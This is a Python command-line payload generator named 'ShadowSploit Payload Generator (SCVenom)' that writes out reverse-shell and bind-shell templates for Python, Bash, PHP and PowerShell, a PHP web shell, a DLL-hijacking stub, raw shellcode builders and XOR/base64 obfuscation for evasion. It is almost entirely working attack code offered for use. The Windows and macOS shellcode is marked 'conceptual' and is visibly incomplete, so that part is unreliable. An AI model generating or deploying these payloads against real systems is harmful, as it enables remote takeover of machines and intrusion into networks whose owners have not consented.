#!/usr/bin/env python3
import argparse
import socket
import struct
import subprocess
import sys
import textwrap
import base64
import platform
import os

# ==================== PAYLOADS (All) =======================

PAYLOADS = {
    # Text/script payloads with templates
    "python/reverse_tcp": {
        "desc": "Python Reverse TCP Shell (ext: .py)",
        "template": textwrap.dedent("""
            import socket, subprocess, os
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{LHOST}", {LPORT}))
            [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
            subprocess.call(["/bin/sh", "-i"])
        """),
        "ext": "py",
        "one_liner": 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{LHOST}\',{LPORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\'/bin/sh\',\'-i\'])"'
    },
    "python/bind_tcp": {
        "desc": "Python Bind TCP Shell (ext: .py)",
        "template": textwrap.dedent("""
            import socket, subprocess, os
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("{LHOST}", {LPORT}))
            s.listen(1)
            conn, addr = s.accept()
            [os.dup2(conn.fileno(), fd) for fd in (0, 1, 2)]
            subprocess.call(["/bin/sh", "-i"])
        """),
        "ext": "py",
        "one_liner": None
    },
    "bash/reverse_tcp": {
        "desc": "Bash Reverse TCP Shell (ext: .sh)",
        "template": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
        "ext": "sh",
        "one_liner": None
    },
    "php/reverse_shell": {
        "desc": "PHP Reverse Shell (ext: .php)",
        "template": textwrap.dedent('<?php $sock=fsockopen("{LHOST}",{LPORT}); exec("/bin/sh -i <&3 >&3 2>&3"); ?>'),
        "ext": "php",
        "one_liner": None
    },
    "php/web_shell": {
        "desc": "PHP Web Shell (ext: .php)",
        "template": '<?php if(isset($_REQUEST["cmd"])){echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>";} ?>',
        "ext": "php",
        "one_liner": None
    },
    "powershell/reverse_tcp": {
        "desc": "PowerShell Reverse TCP Shell (ext: .ps1)",
        "template": textwrap.dedent(r'''
            powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
        '''),
        "ext": "ps1",
        "one_liner": None
    },
    "windows/dll_hijack": {
        "desc": "Windows DLL Hijacking Payload (cmd.exe) (ext: .c)",
        "template": textwrap.dedent("""
            // windows_dll_hijack.c
            #include <windows.h>

            BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
                if (fdwReason == DLL_PROCESS_ATTACH) {
                    WinExec("cmd.exe", SW_SHOW);
                }
                return TRUE;
            }
        """),
        "ext": "c",
        "one_liner": None
    },
    "windows/priv_esc_cmd": {
        "desc": "Windows Privilege Escalation Command Execution (ext: .ps1)",
        "template": textwrap.dedent(r'''
            powershell -Command "Start-Process cmd -Verb runAs"
        '''),
        "ext": "ps1",
        "one_liner": None
    },

    # Raw shellcode payloads with generators
    "linux/reverse_shellcode": {
        "desc": "Linux x86 Reverse TCP Shellcode (raw binary) (ext: .bin)",
        "generator": "create_linux_shell_code",
        "ext": "bin"
    },
    "windows/reverse_shellcode": {
        "desc": "Windows x86 Reverse TCP Shellcode (raw binary) (ext: .bin)",
        "generator": "create_windows_shell_code",
        "ext": "bin"
    },
    "osx/reverse_shellcode": {
        "desc": "macOS x86_64 Reverse TCP Shellcode (raw binary) (ext: .bin)",
        "generator": "create_macos_shell_code",
        "ext": "bin"
    }
}

# ==================== SHELLCODE GENERATORS =================

def encode_ip_port_windows(ip, port):
    # IP little endian, port little endian for Windows shellcode
    ip_bytes = socket.inet_aton(ip)[::-1]
    port_bytes = struct.pack('<H', port)
    return ip_bytes, port_bytes

def create_linux_shell_code(listener_host, listener_port):
    listener_host_bytes = socket.inet_aton(listener_host)
    listener_port_bytes = struct.pack('>H', listener_port)
    return (
        b"\x31\xc0"              # xor eax,eax
        b"\x50"                  # push eax
        b"\x68" + listener_host_bytes +  # push ip address
        b"\x66\x68" + listener_port_bytes +  # push port
        b"\x66\x6a\x02"          # push 0x2 (AF_INET)
        b"\x89\xe1"              # mov ecx,esp
        b"\x6a\x66"              # push 0x66 (sys_socketcall)
        b"\x58"                  # pop eax
        b"\x50"                  # push eax
        b"\x51"                  # push ecx
        b"\x53"                  # push ebx
        b"\x89\xe1"              # mov ecx,esp
        b"\xcd\x80"              # int 0x80 (socketcall socket)
        b"\x89\xc3"              # mov ebx,eax (save socket fd)
        b"\x31\xc9"              # xor ecx,ecx
        b"\xb1\x03"              # mov cl,3 (dup2 loop count)
        b"\x31\xd2"              # xor edx,edx
        b"\x6a\x3f"              # push 0x3f (sys_dup2)
        b"\x58"                  # pop eax
        b"\xcd\x80"              # int 0x80
        b"\x49"                  # dec ecx
        b"\x79\xf9"              # jns -7 (loop)
        b"\x68\x2f\x2f\x73\x68"  # push "//sh"
        b"\x68\x2f\x62\x69\x6e"  # push "/bin"
        b"\x89\xe3"              # mov ebx,esp
        b"\x50"                  # push eax
        b"\x53"                  # push ebx
        b"\x89\xe1"              # mov ecx,esp
        b"\xb0\x0b"              # mov al,11 (execve)
        b"\xcd\x80"              # int 0x80
    )

def create_windows_shell_code(listener_host, listener_port):
    ip_bytes, port_bytes = encode_ip_port_windows(listener_host, listener_port)
    # Note: This is a conceptual example shellcode snippet; real shellcode should be validated
    return (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        b"\x24\x5b\x5b\x61\x59\x5a\x51"
        + b"\x68" + ip_bytes      # push IP (little endian)
        + b"\x66\x68" + port_bytes # push port (little endian)
        + b"\xff\xe0"            # jmp eax (jump to socket)
    )

def create_macos_shell_code(listener_host, listener_port):
    ip_bytes = socket.inet_aton(listener_host)
    port_bytes = struct.pack('>H', listener_port)
    # Conceptual macOS x86_64 shellcode example
    return (
        b"\x90" * 50 +                  # NOP sled
        b"\x48\x31\xc0"                 # xor rax, rax
        b"\x50"                         # push rax
        b"\x48\xb8" + ip_bytes + b"\x00" * 4 +  # mov rax, sockaddr_in IP + padding
        b"\x66\xc7\x45\xf8" + port_bytes +     # mov word ptr [rbp-8], port
        # ... rest of shellcode to connect and execve /bin/sh ...
        b"\x0f\x05"                     # syscall
    )

# ==================== HELPER FUNCTIONS =====================

def xor_encode(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

def list_payloads():
    print("Available payloads:\n" + "-"*60)
    for key, val in PAYLOADS.items():
        print(f"{key:28} - {val['desc']}")
    print("-" * 60)

def parse_vars(vars_list):
    vars_dict = {}
    for var in vars_list:
        if '=' not in var:
            print(f"Invalid variable format '{var}', expected NAME=VALUE")
            sys.exit(1)
        k, v = var.split('=', 1)
        vars_dict[k.upper()] = v
    return vars_dict

def generate_payload(payload_name, variables, encode_base64=False, xor_key=None, one_liner=False):
    if payload_name not in PAYLOADS:
        print(f"[-] Payload '{payload_name}' not found!")
        sys.exit(1)

    entry = PAYLOADS[payload_name]

    # If generator present, create raw shellcode dynamically
    if 'generator' in entry:
        lhost = variables.get('LHOST', '127.0.0.1')
        lport = int(variables.get('LPORT', 4444))
        shellcode = globals()[entry['generator']](lhost, lport)
        payload_bytes = shellcode

    else:
        # Generate from template for script/text payloads
        template = entry["template"]

        try:
            payload = template.format(**variables)
        except KeyError as e:
            print(f"[-] Missing variable {e} for payload '{payload_name}'")
            sys.exit(1)

        if one_liner and entry.get("one_liner"):
            payload = entry["one_liner"].format(**variables)

        payload_bytes = payload.encode('utf-8')

    # Apply encoding if requested
    if xor_key is not None:
        print(f"[*] Applying XOR encoding with key: {xor_key}")
        payload_bytes = xor_encode(payload_bytes, xor_key)
    if encode_base64:
        print("[*] Applying Base64 encoding")
        payload_bytes = base64.b64encode(payload_bytes)

    return payload_bytes

# Optional: Automatically compile C source to DLL (for windows/dll_hijack)
def try_compile_c_to_dll(src_path, output_path):
    print("[*] Attempting to compile C source to DLL...")
    system = platform.system()
    compile_cmd = None

    if system == "Windows":
        compile_cmd = f"gcc -shared -o {output_path} {src_path} -Wl,--kill-at"
    elif system in ["Linux", "Darwin"]:
        compile_cmd = f"x86_64-w64-mingw32-gcc -shared -o {output_path} {src_path} -Wl,--kill-at"
    else:
        print("[-] Unsupported OS for auto compilation.")
        return False

    print(f"[*] Running compile command: {compile_cmd}")
    try:
        result = subprocess.run(compile_cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[+] Compilation successful!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed:\n{e.stderr.decode()}")
        return False


# ==================== MAIN CLI =============================

def main():
    parser = argparse.ArgumentParser(
        description="ShadowSploit Payload Generator (SCVenom)\nExample usage:\n"
                    "./scvenom.py -p linux/reverse_shellcode LHOST=1.1.1.1 LPORT=4444 -o shell.bin --xor 255 --format base64"
    )
    parser.add_argument("--list", action="store_true", help="List available payloads")
    parser.add_argument("-p", "--payload", help="Payload to generate (e.g. python/reverse_tcp, linux/reverse_shellcode)")
    parser.add_argument("-o", "--output", help="Output file to save payload")
    parser.add_argument("-f", "--format",
                        choices=["raw", "base64", "py", "c", "sh", "php", "ps1"],
                        default="raw", help="Output format or encoding")
    parser.add_argument("--xor", type=int, help="XOR encode payload with single byte key (0-255)")
    parser.add_argument("--one-liner", action="store_true", help="Output script payload as one-liner command")
    parser.add_argument("vars", nargs="*", help="Variables for payload, e.g. LHOST=1.2.3.4 LPORT=4444")

    args = parser.parse_args()

    if args.list:
        list_payloads()
        sys.exit(0)

    if not args.payload:
        parser.error("You must specify a payload with -p or use --list")

    variables = parse_vars(args.vars)
    # Supply defaults
    variables.setdefault('LHOST', '127.0.0.1')
    variables.setdefault('LPORT', '4444')

    # Determine encoding flags
    encode_base64 = (args.format == "base64")

    payload_bytes = generate_payload(
        args.payload,
        variables,
        encode_base64=encode_base64,
        xor_key=args.xor,
        one_liner=args.one_liner
    )

    ext_map = {
        "raw": PAYLOADS[args.payload]["ext"],
        "base64": "txt",
        "py": "py",
        "c": "c",
        "sh": "sh",
        "php": "php",
        "ps1": "ps1"
    }
    file_ext = ext_map.get(args.format, PAYLOADS[args.payload]["ext"])

    output_file = args.output if args.output else f"payload.{file_ext}"

    # Print shellcode hex string if raw shellcode payload
    if 'generator' in PAYLOADS[args.payload]:
        if encode_base64:
            print("[*] Shellcode (Base64):")
            print(payload_bytes.decode())
        else:
            hex_str = ''.join(f"\\x{b:02x}" for b in payload_bytes)
            print("[*] Shellcode (Hex string for Python/C style):")
            print(hex_str)
            print(f"[Info] Length: {len(payload_bytes)} bytes")

    # Write to output file
    with open(output_file, 'wb') as f:
        f.write(payload_bytes)
    print(f"[+] Payload saved to '{output_file}'")

    # Try auto-compile if windows dll hijack C code
    if args.payload == "windows/dll_hijack" and file_ext == "c":
        dll_out = output_file.rsplit('.', 1)[0] + ".dll"
        if try_compile_c_to_dll(output_file, dll_out):
            print(f"[+] DLL generated at: {dll_out}")

if __name__ == "__main__":
    main()
